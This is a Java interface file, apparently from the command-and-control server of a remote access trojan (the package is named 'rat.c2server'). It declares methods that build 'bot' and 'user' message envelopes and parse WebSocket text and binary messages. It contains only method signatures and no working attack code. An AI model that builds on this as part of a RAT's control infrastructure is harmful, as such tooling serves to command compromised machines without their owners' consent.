package devs.alex.sah.rat.c2server.services;

import devs.alex.sah.rat.c2server.models.Message;
import org.springframework.web.socket.BinaryMessage;
import org.springframework.web.socket.TextMessage;

import java.nio.ByteBuffer;

public interface MessagesBuilder {

    String generateBotEnvelope(String packageType, String module, String request, String RequiredResponse);
    String generateBotEnvelope(String packageType, String module, String request);

    String generateUserEnvelope(String packageType, String module, String userId, String RequiredResponse);
    String generateUserEnvelope(String packageType, String module, String userId);

    Message<String> parseMessage(TextMessage message, StringBuffer errors);
    Message<ByteBuffer> parseMessage(BinaryMessage message, StringBuffer errors);

}
